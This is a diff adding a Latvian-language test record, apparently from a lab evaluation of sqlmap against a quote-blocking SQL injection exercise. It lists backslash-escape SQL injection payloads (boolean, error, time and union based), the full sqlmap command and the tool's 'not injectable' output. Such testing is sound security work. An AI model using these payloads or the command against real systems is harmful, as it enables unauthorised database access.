@@ -1,0 +1,20 @@
+=================================================================================
+1. Īpašība: nobloķētas pēdiņas 
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?username=test\&password=or 1=1%23
+3.2. error-based: ?username=test&password=test\
+3.3. time-based: ?username=test\&password=or 
+sleep(5)%23
+3.4. union: ?username=test\&password=union select 1,2,3%23
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 1616 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://192.168.17.134/sqlinjection/example3/?username=test&password=test" -p username,password --risk=3 --level=5
+
+
+7. Jautājumi, kurus uzdeva SQLMap
+7.1. it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+=================================================================================
+all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+
